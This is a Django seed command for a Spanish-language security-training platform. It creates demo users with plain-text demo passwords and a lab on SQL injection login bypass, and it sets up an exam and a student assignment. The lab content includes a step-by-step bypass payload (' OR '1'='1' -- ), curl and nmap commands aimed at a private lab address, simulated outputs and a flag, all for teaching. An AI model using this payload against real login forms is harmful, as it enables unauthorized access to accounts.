"""
Comando de datos demo para probar el frontend sin cargar nada a mano.

Crea (si no existen todavía, por email) tres usuarios — uno por rol — y
reproduce el flujo real de la plataforma en vez de un laboratorio suelto:

1. El admin demo crea un laboratorio `predeterminado` (plantilla), con
   secciones + flag, y lo publica -> aparece en el catálogo público
   (`/laboratorios`, HV-02) para cualquiera, sin necesidad de invitación.
2. El instructor demo lo *duplica* (UC-05, igual que haría un instructor
   real desde "Ver detalle" en el catálogo) -> obtiene su propia copia
   `personalizado`, la publica y le agrega el examen (la duplicación
   copia secciones+flags pero no el examen, a propósito — el instructor
   siempre debe revisarlo/recrearlo).
3. El instructor invita al estudiante demo a *su copia* (no a la
   plantilla — un `predeterminado` no se puede asignar directamente,
   dominio.md §4) y la invitación se acepta, inicializando el progreso.

Con esto: la plantilla es visible en el catálogo para cualquier
visitante, y el estudiante ve su copia asignada en su Dashboard (antes
de este cambio, un laboratorio `personalizado` asignado no aparecía en
el catálogo público *por diseño* — es privado del instructor — pero
tampoco se podía ver su detalle/TOC desde el Dashboard del estudiante
por un bug en la visibilidad; ver `ObtenerDetalleLaboratorioQuery`).

Uso:
    docker compose exec web python manage.py seed_demo_data

Es idempotente: si ya corriste el comando antes, no duplica usuarios, la
plantilla ni la copia del instructor (aunque sí puede seguir intentando
invitar/aceptar si esos pasos anteriores no llegaron a completarse).
"""

from datetime import datetime, timedelta, timezone

from django.contrib.auth.hashers import make_password
from django.core.management.base import BaseCommand

from modules.assignments.application.dtos import AceptarInvitacionDTO, InvitarEstudiantesDTO
from modules.assignments.application.use_cases.aceptar_invitacion import (
    AceptarInvitacionUseCase,
)
from modules.assignments.application.use_cases.invitar_estudiantes import (
    InvitarEstudiantesUseCase,
)
from modules.assignments.infrastructure.repositories import AsignacionRepository
from modules.laboratories.application.dtos import (
    AgregarPreguntaDTO,
    AprobarLaboratorioDTO,
    CrearExamenDTO,
    CrearLaboratorioDTO,
    CrearSeccionDTO,
    DefinirFlagDTO,
    DuplicarLaboratorioDTO,
    PublicarLaboratorioDTO,
    SolicitarRevisionLaboratorioDTO,
)
from modules.laboratories.application.use_cases.agregar_pregunta import AgregarPreguntaUseCase
from modules.laboratories.application.use_cases.aprobar_laboratorio import (
    AprobarLaboratorioUseCase,
)
from modules.laboratories.application.use_cases.crear_examen import CrearExamenUseCase
from modules.laboratories.application.use_cases.crear_laboratorio import (
    CrearLaboratorioUseCase,
)
from modules.laboratories.application.use_cases.crear_seccion import CrearSeccionUseCase
from modules.laboratories.application.use_cases.definir_flag import DefinirFlagUseCase
from modules.laboratories.application.use_cases.duplicar_laboratorio import (
    DuplicarLaboratorioUseCase,
)
from modules.laboratories.application.use_cases.publicar_laboratorio import (
    PublicarLaboratorioUseCase,
)
from modules.laboratories.application.use_cases.solicitar_revision_laboratorio import (
    SolicitarRevisionLaboratorioUseCase,
)
from modules.laboratories.domain.value_objects import (
    ComandoSimulado,
    EntornoPractica,
    PasoGuia,
    TipoLaboratorio,
)
from modules.laboratories.infrastructure.repositories import LaboratorioRepository
from modules.progress.infrastructure.repositories import ProgresoRepository
from modules.shared.domain.exceptions import DomainError
from modules.shared.infrastructure.event_dispatcher import EventDispatcher
from modules.shared.infrastructure.unit_of_work import BaseUnitOfWork
from modules.users.domain.entities import User
from modules.users.domain.value_objects import Email, Rol
from modules.users.infrastructure.repositories import UserRepository

_LAB_NOMBRE = "SQL Injection: Bypass de Login"

_DEMO_USERS = [
    {
        "email": "admin@platlab.demo",
        "password": "Admin1234",
        "nombre_completo": "Admin Demo",
        "rol": Rol.ADMINISTRADOR,
    },
    {
        "email": "instructor@platlab.demo",
        "password": "Instructor1234",
        "nombre_completo": "Instructor Demo",
        "rol": Rol.INSTRUCTOR,
    },
    {
        "email": "estudiante@platlab.demo",
        "password": "Estudiante1234",
        "nombre_completo": "Estudiante Demo",
        "rol": Rol.ESTUDIANTE,
    },
]


def _use_case_kwargs(laboratorio_repository):
    return {
        "unit_of_work": BaseUnitOfWork(),
        "event_dispatcher": EventDispatcher(),
        "laboratorio_repository": laboratorio_repository,
    }


class Command(BaseCommand):
    help = "Crea usuarios demo (admin/instructor/estudiante) y un laboratorio de ejemplo."

    def handle(self, *args, **options):
        user_repository = UserRepository()

        usuarios = {}
        for data in _DEMO_USERS:
            existente = user_repository.get_by_email(data["email"])
            if existente:
                usuarios[data["rol"]] = existente
                self.stdout.write(f"= usuario ya existe: {data['email']} ({data['rol'].value})")
                continue
            creado = user_repository.add(
                User(
                    email=Email(data["email"]),
                    nombre_completo=data["nombre_completo"],
                    rol=data["rol"],
                    password_hash=make_password(data["password"]),
                )
            )
            usuarios[data["rol"]] = creado
            self.stdout.write(
                self.style.SUCCESS(f"+ usuario creado: {data['email']} ({data['rol'].value})")
            )

        admin = usuarios[Rol.ADMINISTRADOR]
        instructor = usuarios[Rol.INSTRUCTOR]
        estudiante = usuarios[Rol.ESTUDIANTE]

        laboratorio_repository = LaboratorioRepository()

        template = self._buscar_template_existente(laboratorio_repository)
        if template:
            self.stdout.write(f"= plantilla del catálogo ya existe: {template.id}")
        else:
            template = self._crear_template_demo(laboratorio_repository, admin)
            self.stdout.write(
                self.style.SUCCESS(f"+ plantilla creada y publicada en el catálogo: {template.id}")
            )

        copia = self._buscar_copia_existente(laboratorio_repository, instructor.id, template.id)
        if copia:
            self.stdout.write(f"= copia del instructor ya existe: {copia.id}")
        else:
            copia = self._crear_copia_instructor(laboratorio_repository, instructor, admin, template)
            msg = f"+ copia del instructor creada, publicada y con examen: {copia.id}"
            self.stdout.write(self.style.SUCCESS(msg))

        self._asignar_a_estudiante(instructor, estudiante, copia.id)

        self.stdout.write("")
        self.stdout.write(self.style.SUCCESS("Listo. Credenciales de prueba:"))
        for data in _DEMO_USERS:
            self.stdout.write(f"  {data['rol'].value:<14} {data['email']:<28} {data['password']}")

    # -- plantilla (predeterminado, admin) ----------------------------------

    def _buscar_template_existente(self, laboratorio_repository: LaboratorioRepository):
        candidatos = laboratorio_repository.find_catalogo(nombre=_LAB_NOMBRE)
        return next(
            (
                lab
                for lab in candidatos
                if lab.nombre == _LAB_NOMBRE and lab.tipo == TipoLaboratorio.PREDETERMINADO
            ),
            None,
        )

    def _crear_template_demo(self, laboratorio_repository: LaboratorioRepository, admin):
        kwargs = _use_case_kwargs(laboratorio_repository)

        laboratorio = CrearLaboratorioUseCase(**kwargs).execute(
            CrearLaboratorioDTO(
                nombre=_LAB_NOMBRE,
                descripcion=(
                    "Laboratorio introductorio: identificá y explotá una vulnerabilidad "
                    "de inyección SQL en un formulario de login para omitir la autenticación."
                ),
                nivel_dificultad="basico",
                actor_id=admin.id,
                actor_rol="administrador",
                temas=["sql injection", "autenticación"],
                resumen_cierre=(
                    "<h3>Resumen</h3>"
                    "<p>Explotaste una inyección SQL clásica en un formulario de login para "
                    "saltarte la autenticación sin conocer ninguna contraseña real — el mismo "
                    "patrón (concatenar entrada de usuario directo en una consulta SQL) sigue "
                    "apareciendo en aplicaciones reales hoy en día.</p>"
                    "<h3>Lo que te llevás</h3>"
                    "<ul>"
                    "<li>Reconocer cuándo una entrada se concatena sin sanitizar en una consulta.</li>"
                    "<li>Construir un payload que altere la lógica <code>WHERE</code> de la "
                    "consulta original.</li>"
                    "<li>La defensa correcta: consultas parametrizadas / prepared statements, "
                    "nunca concatenación de strings.</li>"
                    "</ul>"
                    "<p>Cuando estés listo, presentá el examen para cerrar el laboratorio.</p>"
                ),
            )
        )

        CrearSeccionUseCase(**kwargs).execute(
            CrearSeccionDTO(
                laboratorio_id=laboratorio.id,
                titulo="Introducción a SQL Injection",
                contenido_teorico=(
                    "<h3>¿Qué es SQL Injection?</h3>"
                    "<p>SQL Injection (SQLi) es una de las vulnerabilidades web más antiguas y "
                    "todavía una de las más comunes (OWASP Top 10, categoría A03:2021 — "
                    "Injection). Ocurre cuando la entrada de un usuario se concatena "
                    "<em>directamente</em> en una consulta SQL sin sanitizar ni parametrizar, "
                    "permitiendo que ese usuario altere la lógica de la consulta original.</p>"
                    "<h3>Un ejemplo mínimo</h3>"
                    "<p>Un formulario de login típico, mal implementado, arma la consulta así:</p>"
                    "<pre>query = \"SELECT * FROM users WHERE username = '\" + user_input "
                    "+ \"' AND password = '\" + pass_input + \"'\"</pre>"
                    "<p>Si <code>user_input</code> se toma tal cual del formulario, un atacante "
                    "puede escribir algo que ya no sea solo \"un nombre de usuario\", sino código "
                    "SQL adicional que cambia el significado completo de la consulta.</p>"
                    "<h3>Impacto real</h3>"
                    "<ul>"
                    "<li>Bypass de autenticación (lo que vas a hacer en este laboratorio).</li>"
                    "<li>Exfiltración de datos de toda la base (usuarios, contraseñas, tarjetas).</li>"
                    "<li>Modificación o borrado de datos.</li>"
                    "<li>En algunos motores, incluso ejecución de comandos en el servidor.</li>"
                    "</ul>"
                    "<h3>Cómo se previene</h3>"
                    "<p>La defensa correcta es usar <strong>consultas parametrizadas / prepared "
                    "statements</strong>, donde el motor de base de datos trata la entrada del "
                    "usuario siempre como dato, nunca como código — nunca concatenar strings para "
                    "construir SQL.</p>"
                    "<p>En este laboratorio vas a explotar un formulario de login vulnerable para "
                    "autenticarte sin conocer una contraseña válida, usando la consola de práctica "
                    "de la siguiente sección. No hace falta que instales nada: es un entorno "
                    "simulado, pensá los comandos como si estuvieras frente a una term real.</p>"
                ),
                orden=1,
                actor_id=admin.id,
                actor_rol="administrador",
                tiene_practica=False,
                objetivos=[
                    "Explicar qué es SQL Injection y por qué sigue siendo tan común.",
                    "Identificar el patrón de código vulnerable (concatenación de strings en SQL).",
                    "Reconocer el impacto real de una inyección exitosa.",
                ],
                duracion_estimada_minutos=10,
            )
        )

        seccion_practica = CrearSeccionUseCase(**kwargs).execute(
            CrearSeccionDTO(
                laboratorio_id=laboratorio.id,
                titulo="Bypass de login vulnerable",
                contenido_teorico=(
                    "<h3>El objetivo</h3>"
                    "<p>Tenés acceso a una consola de práctica contra una máquina objetivo "
                    "(<code>192.168.56.10</code>) que expone un formulario de login en "
                    "<code>/login.php</code>. El backend arma la consulta de autenticación así:</p>"
                    "<pre>SELECT * FROM users WHERE username = '&lt;input&gt;' "
                    "AND password = '&lt;input&gt;'</pre>"
                    "<h3>Tu misión</h3>"
                    "<p>Encontrá una entrada que altere la lógica de esa consulta para "
                    "autenticarte <strong>sin conocer la contraseña real</strong> de ningún "
                    "usuario. Usá la consola de la derecha para explorar el objetivo — probá "
                    "reconocimiento, mirá el formulario, y experimentá con el campo usuario.</p>"
                    "<p>Cuando la consola te devuelva la flag, copiala y pegala en el campo de "
                    "abajo para marcar la sección como resuelta.</p>"
                    "<p>Tenés la guía paso a paso disponible arriba si preferís seguir una "
                    "metodología guiada en vez de explorar a ciegas — podés abrirla en una "
                    "pestaña aparte y dejarla abierta mientras trabajás acá.</p>"
                ),
                orden=2,
                actor_id=admin.id,
                actor_rol="administrador",
                tiene_practica=True,
                objetivos=[
                    "Confirmar el punto de inyección en el formulario de login.",
                    "Construir un payload que neutralice la verificación de contraseña.",
                    "Capturar la flag devuelta por el servidor tras el bypass exitoso.",
                ],
                duracion_estimada_minutos=25,
                pasos_guia=[
                    PasoGuia(
                        orden=1,
                        titulo="Reconocimiento",
                        instrucciones=(
                            "<p>Escaneá el objetivo para confirmar qué servicios están expuestos.</p>"
                        ),
                        comando_sugerido="nmap -sV 192.168.56.10",
                    ),
                    PasoGuia(
                        orden=2,
                        titulo="Inspeccioná el formulario",
                        instrucciones=(
                            "<p>Traé el HTML de la página de login para entender los campos del "
                            "formulario y el método de envío.</p>"
                        ),
                        comando_sugerido="curl -s http://192.168.56.10/login.php",
                    ),
                    PasoGuia(
                        orden=3,
                        titulo="Confirmá el punto de inyección",
                        instrucciones=(
                            "<p>A veces hay pistas en archivos de backup o configuración mal "
                            "protegidos.</p>"
                        ),
                        comando_sugerido="ls\ncat config.php.bak",
                    ),
                    PasoGuia(
                        orden=4,
                        titulo="Construí el payload",
                        instrucciones=(
                            "<p>El objetivo es que la cláusula <code>WHERE</code> se evalúe "
                            "siempre como verdadera, sin importar la contraseña. Un primer "
                            "intento razonable como usuario sería <code>' OR '1'='1</code>.</p>"
                            "<p>Pero ojo: el backend concatena <em>también</em> la condición de "
                            "contraseña con <code>AND</code>, y en SQL <code>AND</code> se evalúa "
                            "antes que <code>OR</code>. La consulta resultante queda "
                            "(conceptualmente) <code>SELECT * FROM users WHERE username = '' OR "
                            "'1'='1' AND password = '...'</code>, que se interpreta como "
                            "<code>username='' OR ('1'='1' AND password='...')</code> — como la "
                            "contraseña que mandaste seguro no coincide, ¡el bypass falla! Para "
                            "neutralizar la comparación de contraseña, agregá un comentario SQL "
                            "(<code>-- </code>, con un espacio después) al final del username: "
                            "todo lo que venga después se ignora.</p>"
                        ),
                        comando_sugerido="' OR '1'='1' -- ",
                    ),
                    PasoGuia(
                        orden=5,
                        titulo="Enviá el payload",
                        instrucciones="<p>Mandá el payload construido en el paso anterior.</p>",
                        comando_sugerido=(
                            "curl -s http://192.168.56.10/login.php "
                            "--data-urlencode \"username=' OR '1'='1' -- \" "
                            "--data-urlencode 'password=x'"
                        ),
                    ),
                    PasoGuia(
                        orden=6,
                        titulo="Capturá la flag",
                        instrucciones=(
                            "<p>La respuesta del servidor va a incluir la flag. Copiala tal cual "
                            "(formato <code>FLAG{...}</code>) y pegala en el campo de envío de "
                            "esta sección.</p>"
                            "<blockquote>Tip: si algo no funciona, revisá que estés usando "
                            "comillas simples exactamente como se muestra — es la parte más "
                            "común de errar al tipear el payload a mano.</blockquote>"
                        ),
                    ),
                ],
                entorno_practica=EntornoPractica(
                    prompt="estudiante@labs:~$",
                    banner=(
                        "Conectado a la máquina objetivo (192.168.56.10).\n"
                        "Consola de práctica simulada — no ejecuta comandos reales contra "
                        "ningún sistema.\n"
                        "Escribí 'help' para ver los comandos sugeridos."
                    ),
                    comandos=[
                        ComandoSimulado(
                            comando="nmap -sV 192.168.56.10",
                            salida=(
                                "Starting Nmap 7.94 ( https://nmap.org )\n"
                                "Nmap scan report for 192.168.56.10\n"
                                "PORT   STATE SERVICE VERSION\n"
                                "22/tcp open  ssh     OpenSSH 8.9\n"
                                "80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))\n"
                                "Service Info: OS: Linux\n"
                                "\nNmap done: 1 IP address (1 host up) scanned"
                            ),
                        ),
                        ComandoSimulado(
                            comando="curl -s http://192.168.56.10/login.php",
                            salida=(
                                "<form method=\"POST\" action=\"/login.php\">\n"
                                "  <input type=\"text\" name=\"username\" placeholder=\"usuario\">\n"
                                "  <input type=\"password\" name=\"password\" placeholder=\"contraseña\">\n"
                                "  <button type=\"submit\">Ingresar</button>\n"
                                "</form>\n"
                                "<!-- TODO: sacar config.php.bak del server antes de producción -->"
                            ),
                        ),
                        ComandoSimulado(
                            comando="ls",
                            salida="login.php\nconfig.php.bak\nstyle.css",
                        ),
                        ComandoSimulado(
                            comando="cat config.php.bak",
                            salida=(
                                "<?php\n"
                                "// backup viejo, no debería estar accesible\n"
                                "$query = \"SELECT * FROM users WHERE username = '\" . "
                                "$_POST['username'] . \"' AND password = '\" . "
                                "$_POST['password'] . \"'\";\n"
                                "// ver login.php para la version actual\n"
                                "?>"
                            ),
                        ),
                        ComandoSimulado(
                            comando="whoami",
                            salida="estudiante",
                        ),
                        ComandoSimulado(
                            comando="curl -s http://192.168.56.10/login.php --data-urlencode \"username=' OR '1'='1' -- \" --data-urlencode 'password=x'",
                            salida=(
                                "HTTP/1.1 200 OK\n"
                                "<div class=\"success\">\n"
                                "  Bienvenido, admin. Autenticación bypassed.\n"
                                "  FLAG{sql_injection_1s_ez}\n"
                                "</div>"
                            ),
                        ),
                    ],
                ),
                # Entorno REAL además de la consola simulada de arriba — mismo
                # bypass, pero esta vez contra una app Python real corriendo
                # dentro de un contenedor descartable por estudiante
                # (lab_environments). Ver docker/targets/sqli-login/.
                imagen_practica="platlab-target-sqli:latest",
            )
        )

        DefinirFlagUseCase(**kwargs).execute(
            DefinirFlagDTO(
                laboratorio_id=laboratorio.id,
                seccion_id=seccion_practica.id,
                valor="FLAG{sql_injection_1s_ez}",
                actor_id=admin.id,
                actor_rol="administrador",
                pista="Probá con una comilla simple (') en el campo de usuario y mirá qué pasa.",
                paso_a_paso=(
                    "Usá  ' OR '1'='1' --  (con el espacio final) como usuario y cualquier "
                    "valor como contraseña — el comentario SQL al final neutraliza la "
                    "verificación de contraseña. La flag es FLAG{sql_injection_1s_ez}."
                ),
            )
        )

        PublicarLaboratorioUseCase(**kwargs).execute(
            PublicarLaboratorioDTO(
                laboratorio_id=laboratorio.id, actor_id=admin.id, actor_rol="administrador"
            )
        )

        return laboratorio_repository.get_by_id(laboratorio.id)

    # -- copia del instructor (personalizado, duplicada de la plantilla) ---

    def _buscar_copia_existente(
        self, laboratorio_repository: LaboratorioRepository, instructor_id, template_id
    ):
        candidatos = laboratorio_repository.find_catalogo(
            instructor_id=instructor_id, nombre=_LAB_NOMBRE
        )
        return next(
            (
                lab
                for lab in candidatos
                if lab.tipo == TipoLaboratorio.PERSONALIZADO and lab.origen_id == template_id
            ),
            None,
        )

    def _crear_copia_instructor(
        self, laboratorio_repository: LaboratorioRepository, instructor, admin, template
    ):
        kwargs = _use_case_kwargs(laboratorio_repository)

        resultado = DuplicarLaboratorioUseCase(**kwargs).execute(
            DuplicarLaboratorioDTO(
                laboratorio_id=template.id, actor_id=instructor.id, actor_rol="instructor"
            )
        )

        # Un personalizado ya no se publica directo: el instructor lo manda
        # a revisión y un admin lo aprueba (mismo flujo real que seguiría
        # cualquier laboratorio subido por un instructor).
        SolicitarRevisionLaboratorioUseCase(**kwargs).execute(
            SolicitarRevisionLaboratorioDTO(
                laboratorio_id=resultado.id, actor_id=instructor.id, actor_rol="instructor"
            )
        )
        AprobarLaboratorioUseCase(**kwargs).execute(
            AprobarLaboratorioDTO(
                laboratorio_id=resultado.id, actor_id=admin.id, actor_rol="administrador"
            )
        )

        CrearExamenUseCase(**kwargs).execute(
            CrearExamenDTO(
                laboratorio_id=resultado.id, actor_id=instructor.id, actor_rol="instructor"
            )
        )

        opciones = [
            "Concatenar strings directamente en la consulta",
            "Usar prepared statements / parametrized queries",
            "Deshabilitar JavaScript en el navegador",
            "Usar solo HTTPS",
        ]
        AgregarPreguntaUseCase(**kwargs).execute(
            AgregarPreguntaDTO(
                laboratorio_id=resultado.id,
                enunciado="¿Cuál de las siguientes es una defensa efectiva contra SQL Injection?",
                tipo="opcion_multiple",
                respuesta="Usar prepared statements / parametrized queries",
                actor_id=instructor.id,
                actor_rol="instructor",
                opciones=opciones,
            )
        )
        AgregarPreguntaUseCase(**kwargs).execute(
            AgregarPreguntaDTO(
                laboratorio_id=resultado.id,
                enunciado=(
                    "¿Qué carácter se usa comúnmente para 'escapar' de una consulta SQL "
                    "vulnerable a inyección?"
                ),
                tipo="abierta",
                respuesta="'",
                actor_id=instructor.id,
                actor_rol="instructor",
            )
        )
        AgregarPreguntaUseCase(**kwargs).execute(
            AgregarPreguntaDTO(
                laboratorio_id=resultado.id,
                enunciado="¿A qué categoría del OWASP Top 10 (2021) pertenece SQL Injection?",
                tipo="opcion_multiple",
                respuesta="A03:2021 - Injection",
                actor_id=instructor.id,
                actor_rol="instructor",
                opciones=[
                    "A01:2021 - Broken Access Control",
                    "A03:2021 - Injection",
                    "A05:2021 - Security Misconfiguration",
                    "A07:2021 - Identification and Authentication Failures",
                ],
            )
        )
        AgregarPreguntaUseCase(**kwargs).execute(
            AgregarPreguntaDTO(
                laboratorio_id=resultado.id,
                enunciado=(
                    "El payload  ' OR '1'='1  funciona en el login del laboratorio porque..."
                ),
                tipo="opcion_multiple",
                respuesta="La condición '1'='1' siempre es verdadera, cumpliendo el WHERE sin conocer la contraseña real",
                actor_id=instructor.id,
                actor_rol="instructor",
                opciones=[
                    "Porque el servidor tiene un firewall mal configurado",
                    (
                        "La condición '1'='1' siempre es verdadera, cumpliendo el WHERE sin "
                        "conocer la contraseña real"
                    ),
                    "Porque el password se envía sin cifrar",
                    "Porque el servidor no tiene certificado HTTPS",
                ],
            )
        )

        return laboratorio_repository.get_by_id(resultado.id)

    # -- asignación al estudiante -------------------------------------------

    def _asignar_a_estudiante(self, instructor, estudiante, laboratorio_id):
        asignacion_repository = AsignacionRepository()
        laboratorio_repository = LaboratorioRepository()
        user_repository = UserRepository()
        progreso_repository = ProgresoRepository()

        resultado = InvitarEstudiantesUseCase(
            unit_of_work=BaseUnitOfWork(),
            event_dispatcher=EventDispatcher(),
            asignacion_repository=asignacion_repository,
            laboratorio_repository=laboratorio_repository,
            user_repository=user_repository,
        ).execute(
            InvitarEstudiantesDTO(
                laboratorio_id=laboratorio_id,
                estudiantes=[str(estudiante.email)],
                actor_id=instructor.id,
                actor_rol="instructor",
                fecha_vencimiento=datetime.now(timezone.utc) + timedelta(days=30),
            )
        )

        invitacion = resultado.invitaciones[0]
        if invitacion.resultado == "ya_vigente":
            self.stdout.write(
                "= el estudiante demo ya tenía una asignación vigente para este laboratorio"
            )
            return
        if invitacion.resultado != "invitado" or invitacion.asignacion_id is None:
            msg = f"! no se pudo invitar al estudiante demo: {invitacion.resultado}"
            self.stdout.write(self.style.WARNING(msg))
            return

        self.stdout.write(self.style.SUCCESS("+ invitación creada para el estudiante demo"))

        try:
            AceptarInvitacionUseCase(
                unit_of_work=BaseUnitOfWork(),
                event_dispatcher=EventDispatcher(),
                asignacion_repository=asignacion_repository,
                laboratorio_repository=laboratorio_repository,
                progreso_repository=progreso_repository,
            ).execute(
                AceptarInvitacionDTO(
                    asignacion_id=invitacion.asignacion_id, estudiante_id=estudiante.id
                )
            )
            self.stdout.write(self.style.SUCCESS("+ invitación aceptada (progreso inicializado)"))
        except DomainError as exc:
            self.stdout.write(
                self.style.WARNING(f"! no se pudo aceptar la invitación demo: {exc.message}")
            )
